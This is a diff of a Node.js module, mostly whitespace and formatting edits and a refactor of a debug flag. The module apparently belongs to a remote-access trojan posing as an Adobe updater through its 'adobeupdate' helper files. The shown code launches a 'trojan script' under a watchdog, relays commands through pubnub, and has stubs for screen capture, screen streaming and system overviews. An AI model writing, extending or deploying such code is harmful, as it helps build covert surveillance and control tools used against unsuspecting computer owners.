@@ -17,7 +17,7 @@ class CmdConfig {
     #__parentcmdconfig = null;
     #__pubnubrelay = null;
     #__clientjob = null;
-    #__cmdtaskname = '';
+    #__cmdtaskname = "";
 
     get cmdtaskname() {
         return this.#__cmdtaskname;
@@ -265,7 +265,7 @@ class CmdConfig {
             throw new Error("childcmd does not have valid child process");
         }
 
-        if (! helper_ps.isChildHealthy(childp)) {
+        if (!helper_ps.isChildHealthy(childp)) {
             throw new Error("childprocess is not healthy");
         }
 
@@ -278,7 +278,9 @@ class CmdConfig {
         };
 
         if (childp.connected && !childp.killed) {
-            helper.logmsg("[VQ1J] sending message to child: " + JSON.stringify(msgout));
+            helper.logmsg(
+                "[VQ1J] sending message to child: " + JSON.stringify(msgout)
+            );
 
             childp.send(msgout);
         }
@@ -299,7 +301,11 @@ class CmdConfig {
 
         return new Promise((resolve, reject) => {
             if (!helper.fileExists(helper_config.systemconfig.trojanfpath)) {
-                reject(new Error(`trojan script does not exists at ${helper_config.systemconfig.trojanfpath}`));
+                reject(
+                    new Error(
+                        `trojan script does not exists at ${helper_config.systemconfig.trojanfpath}`
+                    )
+                );
             }
 
             if (exitparent) {
@@ -347,14 +353,18 @@ class CmdConfig {
 
             // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
             child.on("message", (message) => {
-                helper.logmsg("[YER]incomming message: " + JSON.stringify(message));
+                helper.logmsg(
+                    "[YER]incomming message: " + JSON.stringify(message)
+                );
 
                 // [X9W2]: implemented within CmdConfig class, see documentation above [M5BR]
                 this.processMessage(message);
             });
 
             child.on("exit", (code) => {
-                helper.logmsg(`Child process ${child.pid} exited with code ${code}`);
+                helper.logmsg(
+                    `Child process ${child.pid} exited with code ${code}`
+                );
             });
 
             child.on("close", (code) => {
@@ -431,7 +441,10 @@ class CmdConfig {
 
             for (
                 let i = 0;
-                i < (ISDEBUG ? 3 : helper_config.systemconfig.staticdelay);
+                i <
+                (helper_ps.isdebug()
+                    ? 3
+                    : helper_config.systemconfig.staticdelay);
                 i++
             ) {
                 helper.logmsg(
@@ -447,7 +460,7 @@ class CmdConfig {
 
             helper.logmsg(`sleeping for an additional ${num} seconds`);
 
-            for (let i = 0; i < (ISDEBUG ? 0 : num); i++) {
+            for (let i = 0; i < (helper_ps.isdebug() ? 0 : num); i++) {
                 helper.logmsg(
                     `sleeping one second... [${i + 1}/${
                         helper_config.systemconfig.staticdelay
@@ -466,9 +479,7 @@ class CmdConfig {
 }
 
 // TODO implement
-class ClientJob {
-
-}
+class ClientJob {}
 
 // --- IPC for current running process: message send/receive
 
@@ -929,8 +940,6 @@ async function getsystemoverview() {
     process.exit(0);
 }
 
-
-
 function relay() {
     helper.logmsg("starting");
 
@@ -1207,9 +1216,7 @@ async function pspcmon() {
 
 // --- BEGIN streamscreen
 
-async function streamscreen() {
-
-}
+async function streamscreen() {}
 
 function exec_getscreencapture() {
     return new Promise((resolve, reject) => {
@@ -1287,11 +1294,10 @@ const helper_ps = require("./adobeupdate.helper.ps.js");
 
 var runningcmdname = helper_ps.getcmdname();
 var runningcmd = new CmdConfig(runningcmdname);
-var ISDEBUG = helper_ps.isdebug();
 
 module.exports = {
     CmdConfig: CmdConfig,
-    runningcmd: runningcmd
+    runningcmd: runningcmd,
 };
 
 const helper = require("./adobeupdate.helper.js");
